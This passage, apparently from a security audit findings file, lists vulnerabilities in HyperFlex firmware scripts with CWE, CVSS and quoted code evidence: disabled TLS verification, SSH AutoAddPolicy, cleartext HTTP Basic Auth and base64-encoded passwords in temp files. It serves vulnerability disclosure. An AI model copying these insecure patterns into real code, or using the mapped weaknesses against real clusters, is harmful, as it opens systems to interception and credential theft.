    ),
    "description": (
        "Eleven Ansible library modules and ESX upgrade hook scripts disable TLS or SSH "
        "host key validation across operations that span the full cluster lifecycle. "
        "stig.py (STIG enforcement Ansible module) applies the ssl._create_default_https_context "
        "monkey-patch at L126 and passes verify=False in two REST calls that submit controller "
        "admin credentials via HTTP Basic Auth — the STIG compliance module cannot validate "
        "the TLS certificate of the controller it is hardening. "
        "enableEsxSelfSignedCert.py applies the monkey-patch while enabling self-signed "
        "certificate support on ESX hosts — the script managing certificate trust policy "
        "bypasses its own TLS validation. "
        "destroyStCtlVM.py (controller VM destruction during cluster teardown) applies the "
        "monkey-patch before connecting to vCenter. "
        "assert_host_connected.py (cluster join validation) applies the monkey-patch. "
        "powerCycleCIMC.py, cimcSettings.py, and setStCtlPasswd.py unconditionally call "
        "requests.packages.urllib3.disable_warnings() — affecting CIMC power operations, "
        "CIMC settings configuration, and controller VM password changes respectively. "
        "uninstall_cluster.py and configureRDMs.py (Raw Device Mapping configuration) "
        "each use AutoAddPolicy for SSH connections to cluster nodes. "
        "9998_remove_host_authorized_keys_ESX.py (removes SSH keys from ESX hosts — "
        "a post-upgrade security cleanup operation) uses AutoAddPolicy, allowing an MITM "
        "to impersonate the target ESX host during authorized-key removal. "
        "9951_enable_AHCI_driver_ESX.py (AHCI driver enablement) uses AutoAddPolicy."
    ),
    "evidence": (
        "  library/stig.py L53, L82:\n"
        "    requests.get(getstatus_url, auth=(username, password), ..., verify=False)\n"
        "    requests.post(set_url, auth=(username, password), ..., verify=False)\n"
        "    L126: ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/enableEsxSelfSignedCert.py L80:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "    (script enables self-signed certs on ESX while bypassing own TLS validation)\n"
        "\n"
        "  library/destroyStCtlVM.py L304:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/assert_host_connected.py L117:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/powerCycleCIMC.py L100, library/cimcSettings.py L306,\n"
        "  library/setStCtlPasswd.py L123:\n"
        "    requests.packages.urllib3.disable_warnings()  # unconditional\n"
        "\n"
        "  library/uninstall_cluster.py L64:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  library/configureRDMs.py L399, L425:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  upgradeclusterposthooks/9998_remove_host_authorized_keys_ESX.py L24:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "    (SSH host key validation bypassed during authorized-key removal)\n"
        "\n"
        "  upgradeclusterprehooks/9951_enable_AHCI_driver_ESX.py L88:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())"
    ),
}


HX_F301 = {
    "id": "HX-F301",
    "title": (
        "TLS Certificate Validation Disabled Across 9 Additional Ansible Library Modules "
        "Including vCenter Connectivity, HA/DRS Configuration, and OVA Deployment"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/library/ "
        "(reserveMem.py:L62, vcenter.py:L297/389/456, configureEsx.py:L68, "
        "deployOva.py:L97, setstaticip.py:L291, factory_datastore.py:L131/229, "
        "configureHaDrs.py:L153/194, addExtraConfig.py:L47, springpathHclConf.py:L70)"
    ),
    "description": (
        "Nine Ansible library modules disable TLS or SSH host key validation across "
        "cluster lifecycle operations. vcenter.py — the dedicated vCenter connectivity "
        "module — combines all three bypass patterns: verify=False in a REST call at L297, "
        "ssl._create_default_https_context monkey-patch at L389 before SmartConnect, and "
        "requests.packages.urllib3.disable_warnings() at L456. "
        "reserveMem.py (memory reservation during controller deployment) applies the "
        "monkey-patch at L62. "
        "configureEsx.py (ESX host configuration) applies the monkey-patch at L68. "
        "deployOva.py (OVA template deployment) calls disable_warnings() at L97. "
        "setstaticip.py (static IP assignment during cluster bootstrapping) calls "
        "disable_warnings() at L291. "
        "factory_datastore.py (factory datastore creation) uses AutoAddPolicy for SSH "
        "at L131 and applies the monkey-patch at L229. "
        "configureHaDrs.py (High Availability and Distributed Resource Scheduler "
        "configuration) applies the monkey-patch at L153 and calls disable_warnings() "
        "at L194. "
        "addExtraConfig.py (VM extra configuration) applies the monkey-patch at L47. "
        "springpathHclConf.py (HCL validation) applies the monkey-patch at L70."
    ),
    "evidence": (
        "  library/vcenter.py L297:\n"
        "    requests.put(url, data=json.dumps(body), headers=headers, verify=False)\n"
        "  library/vcenter.py L389:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "  library/vcenter.py L456:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "\n"
        "  library/reserveMem.py L62:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/configureEsx.py L68:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/deployOva.py L97:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "\n"
        "  library/setstaticip.py L291:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "\n"
        "  library/factory_datastore.py L131:\n"
        "    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "  library/factory_datastore.py L229:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/configureHaDrs.py L153:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "  library/configureHaDrs.py L194:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "\n"
        "  library/addExtraConfig.py L47:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  library/springpathHclConf.py L70:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context"
    ),
}

HX_F302 = {
    "id": "HX-F302",
    "title": (
        "TLS Validation and SSH Host Key Verification Disabled in Secure Boot "
        "State Management Ansible Module"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/library/secureBoot.py "
        "(L22, L107, L145, L171, L248)"
    ),
    "description": (
        "The secureBoot.py Ansible library module — responsible for querying and setting "
        "the UEFI Secure Boot state on HyperFlex controller VMs — disables TLS certificate "
        "validation and SSH host key verification across all its operations. "
        "L22 unconditionally suppresses InsecureRequestWarning at module import: "
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning). "
        "L107 uses AutoAddPolicy for SSH connections to controller nodes. "
        "L145 passes verify=False in the REST POST that sets the Secure Boot state. "
        "L171 passes verify=False in the REST GET that reads the Secure Boot state. "
        "L248 applies the ssl._create_default_https_context monkey-patch for SmartConnect. "
        "All three bypass patterns — disable_warnings, AutoAddPolicy, and verify=False — "
        "are present in a single module whose explicit function is to enforce a security "
        "policy (UEFI Secure Boot) on cluster nodes. An MITM positioned between the "
        "Ansible controller and target can serve a fraudulent Secure Boot state response, "
        "causing the module to report the feature as enabled when it is not, or to set an "
        "attacker-controlled boot policy."
    ),
    "evidence": (
        "  library/secureBoot.py L22:\n"
        "    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n"
        "\n"
        "  library/secureBoot.py L107:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  library/secureBoot.py L145:\n"
        "    post_req = requests.post(setstatus_url,\n"
        "        data=json.dumps(secureboot_state),\n"
        "        auth=(controller_username, controller_password),\n"
        "        headers=header, verify=False)\n"
        "\n"
        "  library/secureBoot.py L171:\n"
        "    response = requests.get(getstatus_url,\n"
        "        auth=(controller_username, controller_password),\n"
        "        headers=header, verify=False)\n"
        "\n"
        "  library/secureBoot.py L248:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context"
    ),
}

HX_F303 = {
    "id": "HX-F303",
    "title": (
        "SSH Host Key Verification Disabled in Top-Level Ansible uninstall_cluster.py "
        "and configureRDMs.py Scripts"
    ),
    "cwe": "CWE-322",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/uninstall_cluster.py:L64; "
        "mgmt/opt/hyperflex/storfs-deploy/ansible/configureRDMs.py:L399,L425"
    ),
    "description": (
        "Two top-level Ansible scripts use paramiko.AutoAddPolicy() for SSH connections "
        "to cluster nodes. These are distinct from the library/uninstall_cluster.py and "
        "library/configureRDMs.py variants in the ansible library/ directory — separate "
        "files that duplicate the pattern. "
        "uninstall_cluster.py (cluster uninstall, invoked during decommission) uses "
        "AutoAddPolicy at L64 for SSH connections to storage nodes. "
        "configureRDMs.py (Raw Device Mapping configuration for vSphere) uses AutoAddPolicy "
        "at L399 and L425, accepting any SSH host key for node connections during RDM "
        "setup. AutoAddPolicy accepts any host key on first connection without verification, "
        "making both operations vulnerable to MITM interception."
    ),
    "evidence": (
        "  ansible/uninstall_cluster.py L64:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  ansible/configureRDMs.py L399:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "  ansible/configureRDMs.py L425:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())"
    ),
}

HX_F304 = {
    "id": "HX-F304",
    "title": (
        "TLS Private Key Stored in ZooKeeper Data Path Without Confirmed ACL Protection"
    ),
    "cwe": "CWE-312",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "component": (
        "mgmt/opt/hyperflex/storfs-mgmt/hxSvcMgr-1.0/conf/application.conf "
        "(security.sslKeyZKPath, security.sslCertZKPath)"
    ),
    "description": (
        "hxSvcMgr-1.0/conf/application.conf configures the HyperFlex service manager to "
        "store the TLS private key and certificate in ZooKeeper data nodes: "
        "sslKeyZKPath = \"/storvisor/ssl/key\" and sslCertZKPath = \"/storvisor/ssl/certificate\". "
        "ZooKeeper's default ACL model assigns OPEN_ACL_UNSAFE (world:anyone with all "
        "permissions) to newly created nodes unless explicitly overridden. No ZK TLS "
        "configuration (zookeeper.ssl.*, clientCnxnSocket, ssl.quorum.*) is present in "
        "any application.conf or zoo.cfg within the firmware image, indicating ZK traffic "
        "transits port 2181 unencrypted. "
        "The ZK ensemble spans all three controller VMs; SSL key material written to "
        "/storvisor/ssl/key is replicated in cleartext across the cluster network. "
        "Any ZK-connected client or service on a cluster node — regardless of whether it "
        "has a valid service clientId — can read /storvisor/ssl/key if the node's ACL was "
        "created with OPEN_ACL_UNSAFE. The private key enables decryption of captured "
        "HyperFlex management plane TLS traffic and impersonation of the management API "
        "endpoint."
    ),
    "evidence": (
        "  hxSvcMgr-1.0/conf/application.conf:\n"
        "    security {\n"
        "        sslCertZKPath = \"/storvisor/ssl/certificate\"\n"
        "        sslKeyZKPath = \"/storvisor/ssl/key\"\n"
        "    }\n"
        "\n"
        "  No ZK TLS configuration found in firmware image:\n"
        "    grep -r 'zookeeper.ssl\\|clientCnxnSocket\\|ssl.quorum' -- 0 results\n"
        "\n"
        "  ZK ensemble config (hxSvcMgr-1.0/conf/application.conf):\n"
        "    zk {\n"
        "        connectPort = 2181\n"
        "        ensembleSize = 3\n"
        "    }"
    ),
}

HX_F305 = {
    "id": "HX-F305",
    "title": (
        "Cluster-Wide Automatic Password Synchronization Enabled for Privileged "
        "System Accounts root, admin, and diag Across Three Services"
    ),
    "cwe": "CWE-266",
    "severity": "MEDIUM",
    "cvss": 5.3,
    "component": (
        "mgmt/opt/hyperflex/storfs-mgmt/hxSvcMgr-1.0/conf/application.conf:L20-21; "
        "mgmt/opt/hyperflex/storfs-mgmt/hxSupportSvc-1.0/conf/application.conf:L8-9; "
        "mgmt/opt/hyperflex/storfs-mgmt/stMgr-1.0/conf/application.conf:L25-26"
    ),
    "description": (
        "Three HyperFlex management services — hxSvcMgr, hxSupportSvc, and stMgr — are "
        "configured with passwordSyncEnabled = true and passwordSyncAccounts = "
        "[\"root\", \"admin\", \"diag\"]. This configuration causes password changes to the "
        "root, admin, and diag system accounts on any single cluster node to propagate "
        "automatically to all other nodes in the cluster via ZooKeeper coordination. "
        "The diag account is the HyperFlex diagnostic maintenance account with elevated "
        "access to storage and system management functions. "
        "Automatic cluster-wide propagation of root, admin, and diag credential changes "
        "means that a single-node privilege escalation that allows password modification "
        "immediately cascades to all cluster nodes without additional exploitation steps. "
        "Conversely, any process capable of triggering a password sync event through the "
        "ZK coordination path can force credential rotation across the cluster, creating "
        "a denial-of-authentication condition."
    ),
    "evidence": (
        "  hxSvcMgr-1.0/conf/application.conf L20-21:\n"
        "    passwordSyncEnabled = true\n"
        "    passwordSyncAccounts = [\"root\", \"admin\", \"diag\"]\n"
        "\n"
        "  hxSupportSvc-1.0/conf/application.conf L8-9:\n"
        "    passwordSyncEnabled = true\n"
        "    passwordSyncAccounts = [\"root\", \"admin\", \"diag\"]\n"
        "\n"
        "  stMgr-1.0/conf/application.conf L25-26:\n"
        "    passwordSyncEnabled = true\n"
        "    passwordSyncAccounts = [\"root\", \"admin\", \"diag\"]"
    ),
}


HX_F306 = {
    "id": "HX-F306",
    "title": (
        "Root and Admin Credentials Transmitted in Cleartext Over HTTP to "
        "/rest/appliances Endpoint in Three Cluster Utility Scripts"
    ),
    "cwe": "CWE-319",
    "severity": "HIGH",
    "cvss": 7.5,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py:L154-157; "
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py:L394-397; "
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/whitelist.py:L13-16"
    ),
    "description": (
        "Three hx-scripts cluster utility scripts submit root or admin credentials via "
        "HTTP Basic Authentication to the HyperFlex controller REST API, transmitting "
        "credentials in cleartext on the network. "
        "support.py defines admin_user = 'root' at L26 and sends root + password via "
        "HTTP Basic Auth to http://{clusterIp}/rest/appliances at L156-157. "
        "check_vswitch.py sends auth=('admin', password) to "
        "http://{clusterIp}/rest/appliances at L396-397. "
        "whitelist.py defines admin_user = 'root' at L10 and sends root + password to "
        "http://{clusterIp}/rest/appliances at L15-16. "
        "All three scripts call the same /rest/appliances endpoint, which is accessed "
        "via HTTP rather than HTTPS, making the HTTP Basic Auth header (base64-encoded "
        "credentials) visible to any network observer on the management VLAN. "
        "Additionally, support.py disables TLS validation for the external support bundle "
        "upload service at https://upload.hyperflex.io and at a hardcoded external IP "
        "38.140.50.205 (L296-301), both with verify=False."
    ),
    "evidence": (
        "  support.py L26:\n"
        "    admin_user = 'root'\n"
        "  support.py L154-157:\n"
        "    def getControllers(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=(admin_user, password), verify=False)\n"
        "\n"
        "  support.py L296-301:\n"
        "    url = \"https://upload.hyperflex.io/admin/api2/ping\"\n"
        "    r = requests.get(url, verify=False)\n"
        "    url = \"https://38.140.50.205/admin/api2/ping\"\n"
        "    r = requests.get(url, verify=False)\n"
        "\n"
        "  check_vswitch.py L394-397:\n"
        "    def getControllers(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=('admin', password), verify=False)\n"
        "\n"
        "  whitelist.py L10, L13-16:\n"
        "    admin_user = 'root'\n"
        "    def getDisks(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=(admin_user, password), verify=False)"
    ),
}

HX_F307 = {
    "id": "HX-F307",
    "title": (
        "TLS Certificate Validation Disabled Across 8 hx-scripts Cluster Utility Scripts "
        "Including Both STIG Enforcement Scripts, Post-Install, and Node Replace"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/ "
        "(stig_security_settings.py:L21/26-32/364, "
        "stig_security_settings_hx.py:L21/29-35/476, "
        "post_install.py:L74-80/83/700, "
        "node_replace.py:L23/39-45/182, "
        "esx_util.py:L27/41-47/247, "
        "iscsiVolumeAccessCheck.py:L36/41-42, "
        "install_vc_plugin.py:L26/348/386/531, "
        "nginxCertManager.py:L110)"
    ),
    "description": (
        "Eight hx-scripts cluster utility scripts disable TLS certificate validation "
        "across cluster management, STIG enforcement, node operations, and certificate "
        "management functions. "
        "stig_security_settings.py and stig_security_settings_hx.py — the two HyperFlex "
        "STIG compliance enforcement scripts — each apply all three bypass patterns: "
        "requests.packages.urllib3.disable_warnings() at L21, the "
        "ssl._create_default_https_context monkey-patch at L26-32 (stig) / L29-35 (hx), "
        "and paramiko.AutoAddPolicy() at L364 (stig) / L476 (hx). Both STIG enforcement "
        "scripts cannot verify the TLS identity of the ESX hosts they are hardening. "
        "post_install.py applies the monkey-patch (L74-80), disable_warnings (L83), and "
        "verify=False with admin credentials (L700). "
        "node_replace.py applies all three bypass patterns and uses verify=False with "
        "admin credentials at L182. "
        "esx_util.py applies all three bypass patterns and uses verify=False with admin "
        "credentials at L247. "
        "iscsiVolumeAccessCheck.py applies the monkey-patch at L36-42. "
        "install_vc_plugin.py calls disable_warnings at L26, AutoAddPolicy at L348, "
        "verify=False at L386, and ssl._create_unverified_context() directly at L531 "
        "for vCenter SmartConnect during vCenter plugin installation. "
        "nginxCertManager.py passes verify=False to all REST calls that manage nginx "
        "TLS certificates at L110."
    ),
    "evidence": (
        "  hx-scripts/stig_security_settings.py L21, L26-32, L364:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  hx-scripts/stig_security_settings_hx.py L21, L29-35, L476:\n"
        "    (identical patterns to stig_security_settings.py)\n"
        "\n"
        "  hx-scripts/post_install.py L74-80, L83, L700:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
        "    requests.get(url, auth=(admin_user, password), verify=False)\n"
        "\n"
        "  hx-scripts/node_replace.py L23, L39-45, L182:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    requests.get(url, auth=(admin_user, password), verify=False)\n"
        "\n"
        "  hx-scripts/esx_util.py L27, L41-47, L247:\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    requests.get(url, auth=(admin_user, password), verify=False)\n"
        "\n"
        "  hx-scripts/iscsiVolumeAccessCheck.py L36-42:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "\n"
        "  hx-scripts/install_vc_plugin.py L26, L348, L386, L531:\n"
        "    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
        "    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "    requests.get(url, auth=('admin', admin_pass), verify=False)\n"
        "    context = ssl._create_unverified_context()\n"
        "    si = SmartConnect(host=VCENTER, ..., sslContext=context)\n"
        "\n"
        "  hx-scripts/nginxCertManager.py L110:\n"
        "    resp = restFn(url=restUrl, data=data, auth=auth, headers=headers, verify=False)"
    ),
}

HX_F308 = {
    "id": "HX-F308",
    "title": (
        "TLS Certificate Validation Disabled in storfs-misc Top-Level Utility Scripts "
        "Including ZK Database Lister, NAS Mount Cleanup, and PCI Passthrough"
    ),
    "cwe": "CWE-295",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/ "
        "(uninstall_cluster.py:L64, listzkdb.py:L41, "
        "cleanNasStaleMounts.py:L20, pci_passthru.py:L786-787)"
    ),
    "description": (
        "Four top-level storfs-misc utility scripts disable SSH host key verification "
        "or TLS certificate validation. "
        "uninstall_cluster.py (another copy of the cluster uninstall script, separate "
        "from the ansible/uninstall_cluster.py and library/uninstall_cluster.py copies) "
        "uses AutoAddPolicy at L64 for SSH connections to storage nodes. "
        "listzkdb.py (ZooKeeper database inspection utility) uses AutoAddPolicy at L41 "
        "for SSH connections — host key verification disabled for a tool that reads "
        "cluster-wide ZooKeeper data including security configuration paths. "
        "cleanNasStaleMounts.py (NAS stale mount cleanup utility) uses AutoAddPolicy "
        "at L20 for SSH connections to storage nodes. "
        "pci_passthru.py (PCI passthrough device configuration) applies the "
        "ssl._create_default_https_context monkey-patch at L786-787 before connecting "
        "to vSphere APIs."
    ),
    "evidence": (
        "  storfs-misc/uninstall_cluster.py L64:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  storfs-misc/listzkdb.py L41:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  storfs-misc/cleanNasStaleMounts.py L20:\n"
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  storfs-misc/pci_passthru.py L786-787:\n"
        "    ssl._create_default_https_context = \\\n"
        "            ssl._create_unverified_context"
    ),
}


HX_F309 = {
    "id": "HX-F309",
    "title": (
        "TLS Certificate Validation Disabled in Five Additional hx-scripts Cluster "
        "Utility Scripts Including EAM Status, vSwitch Management, and Plugin Update"
    ),
    "cwe": "CWE-295",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/ "
        "(check_eam_status.py:L13-22, cleanup_passthru.py:L22-28, "
        "add_vswitch.py:L15-21, modify_plugin.py:L24/52, addIscsiNetworkToVMs.py:L47-53)"
    ),
    "description": (
        "Five additional hx-scripts cluster utility scripts disable TLS certificate "
        "validation. "
        "check_eam_status.py (ESX Agent Manager health check) applies the "
        "ssl._create_default_https_context monkey-patch at L13-19 and calls "
        "requests.packages.urllib3.disable_warnings() at L22. "
        "cleanup_passthru.py (PCI passthrough cleanup) applies the monkey-patch at L22-28. "
        "add_vswitch.py (vSwitch management) applies the monkey-patch at L15-21. "
        "modify_plugin.py (vCenter plugin modification) calls disable_warnings at L24 "
        "and applies the monkey-patch at L52. "
        "addIscsiNetworkToVMs.py (iSCSI network configuration for VMs) applies the "
        "monkey-patch at L47-53."
    ),
    "evidence": (
        "  hx-scripts/check_eam_status.py L13-22:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "    requests.packages.urllib3.disable_warnings()\n"
        "\n"
        "  hx-scripts/cleanup_passthru.py L22-28:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "\n"
        "  hx-scripts/add_vswitch.py L15-21:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context\n"
        "\n"
        "  hx-scripts/modify_plugin.py L24, L52:\n"
        "    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "\n"
        "  hx-scripts/addIscsiNetworkToVMs.py L47-53:\n"
        "    _create_unverified_https_context = ssl._create_unverified_context\n"
        "    ssl._create_default_https_context = _create_unverified_https_context"
    ),
}

HX_F310 = {
    "id": "HX-F310",
    "title": (
        "TLS and SSH Host Key Validation Disabled Across Seven Cluster Validation "
        "Scripts Including springpath_security.py and Hardware and Network Validators"
    ),
    "cwe": "CWE-295",
    "severity": "HIGH",
    "cvss": 7.4,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/validation/ "
        "(springpath_validation_validator.py:L2190/6778, "
        "springpath_lib_validate_cluster_node_model.py:L43/205/235, "
        "springpath_ssh.py:L46, springpath_networking.py:L28/648, "
        "springpath_security.py:L115/128, "
        "springpath_validation_util.py:L31/45, "
        "springpath_hardware_validator.py:L96)"
    ),
    "description": (
        "Seven pre-deployment and maintenance cluster validation scripts disable TLS "
        "certificate validation or SSH host key verification. "
        "springpath_validation_validator.py uses AutoAddPolicy at L2190 and passes "
        "verify=False with admin credentials at L6778. "
        "springpath_lib_validate_cluster_node_model.py passes verify=False with cluster "
        "credentials in three distinct REST calls: at L43 (cluster_user_name + "
        "cluster_password), at L205 (clusterUser + decodedClusterPassword — indicating "
        "the password was decoded from base64 before being transmitted over a connection "
        "that itself disables TLS validation), and at L235 (clusterUser + clusterPassword). "
        "springpath_ssh.py (SSH utility module used by multiple validators) uses "
        "AutoAddPolicy at L46 — all validation SSH sessions created through this module "
        "inherit the bypass. "
        "springpath_networking.py applies the ssl._create_default_https_context "
        "monkey-patch at L28 and uses AutoAddPolicy at L648. "
        "springpath_security.py — the cluster security validation module — uses "
        "AutoAddPolicy at both L115 and L128, disabling SSH host key verification "
        "across all of its security assessment SSH sessions. "
        "springpath_validation_util.py uses AutoAddPolicy at L31 and L45. "
        "springpath_hardware_validator.py uses AutoAddPolicy at L96."
    ),
    "evidence": (
        "  validation/springpath_validation_validator.py L2190:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "  validation/springpath_validation_validator.py L6778:\n"
        "    requests.get(url, auth=(\"admin\", password), verify=False)\n"
        "\n"
        "  validation/springpath_lib_validate_cluster_node_model.py L43:\n"
        "    requests.get(url, auth=(cluster_user_name, cluster_password),\n"
        "                 verify=False, timeout=30)\n"
        "  validation/springpath_lib_validate_cluster_node_model.py L205:\n"
        "    requests.get(url, auth=(clusterUser, decodedClusterPassword),\n"
        "                 verify=False, timeout=30)\n"
        "  validation/springpath_lib_validate_cluster_node_model.py L235:\n"
        "    requests.get(url, auth=(clusterUser, clusterPassword),\n"
        "                 verify=False, timeout=30)\n"
        "\n"
        "  validation/springpath_ssh.py L46:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  validation/springpath_networking.py L28:\n"
        "    ssl._create_default_https_context = ssl._create_unverified_context\n"
        "  validation/springpath_networking.py L648:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  validation/springpath_security.py L115, L128:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  validation/springpath_validation_util.py L31, L45:\n"
        "    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
        "\n"
        "  validation/springpath_hardware_validator.py L96:\n"
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())"
    ),
}


HX_F311 = {
    "id": "HX-F311",
    "title": (
        "upgrade-hxos.sh Base64-Encodes vCenterPassword, esxPassword, and ctlvmPassword "
        "Into a Non-Deleted Temp File and Globally Disables Ansible SSH Host Key Checking"
    ),
    "cwe": "CWE-261",
    "severity": "HIGH",
    "cvss": 7.5,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/upgrade-hxos.sh "
        "(L97-110, L119-120)"
    ),
    "description": (
        "upgrade-hxos.sh encodes vCenterPassword, esxPassword, and ctlvmPassword using "
        "base64.b64encode() and writes them to a temp file using "
        "tempfile.NamedTemporaryFile(prefix='virtJson_', mode='w', delete=False). "
        "delete=False means the file persists after the handle closes; combined with the "
        "default Python temp file mode (0600 is not guaranteed under all umask settings), "
        "the base64-encoded credentials remain on disk in /tmp until explicitly cleaned up. "
        "Base64 encoding is not encryption — the credentials are trivially recoverable by "
        "anyone who can read the file. This extends the deployment-time CWE-261 pattern "
        "(HX-F291, StDeployImpl.getEncodedPassword) to the upgrade lifecycle. "
        "Additionally, upgrade-hxos.sh sets ANSIBLE_HOST_KEY_CHECKING = 'False' in the "
        "environment before invoking ansible-playbook, globally disabling SSH host key "
        "verification for all Ansible SSH sessions during the cluster upgrade. This is "
        "equivalent to setting AutoAddPolicy on every paramiko SSH session in the entire "
        "upgrade Ansible playbook execution, including connections to storage nodes, "
        "ESX hosts, vCenter, and CIMC."
    ),
    "evidence": (
        "  upgrade-hxos.sh L97-110:\n"
        "    virt = {\n"
        "        \"vCenterPassword\": base64.b64encode(\n"
        "            opts.vcenterPassword.encode('utf-8')).decode(),\n"
        "        \"esxPassword\": base64.b64encode(\n"
        "            opts.esxPassword.encode('utf-8')).decode(),\n"
        "        \"ctlvmPassword\": base64.b64encode(\n"
        "            opts.ctlvmPassword.encode('utf-8')).decode()\n"
        "    }\n"
        "    with tempfile.NamedTemporaryFile(\n"
        "        prefix='virtJson_', mode='w', delete=False) as temp:\n"
        "        temp.writelines(json.dumps(virt))\n"
        "\n"
        "  upgrade-hxos.sh L119-120:\n"
        "    newenviron = os.environ\n"
        "    newenviron['ANSIBLE_HOST_KEY_CHECKING'] = 'False'"
    ),
}

HX_F315 = {
    "id": "HX-F315",
    "title": (
        "TLS Certificate Validation Disabled in config-ctlvm.py Appliance "
        "Controller VM Configuration Script"
    ),
    "cwe": "CWE-295",
    "severity": "MEDIUM",
    "cvss": 5.9,
    "component": (
        "appliance/usr/share/hyperflex/storfs-appliance/config-ctlvm.py "
        "(L533-534)"
    ),
    "description": (
        "config-ctlvm.py — the HyperFlex appliance controller VM configuration script "
        "invoked during controller VM setup and hardware configuration — applies the "
        "ssl._create_default_https_context monkey-patch at L533-534 inside a try/except "
        "block at the start of main(). The try/except silently swallows AttributeError "
        "on Python versions where _create_unverified_context is not available, but on "
        "all HyperFlex-deployed Python versions the patch applies, replacing the "
        "default HTTPS context process-wide for all subsequent requests in the script. "
        "config-ctlvm.py accepts a --password argument at L427 (via argparse with "
        "help=SUPPRESS), receives authentication credentials for vSphere/CIMC "
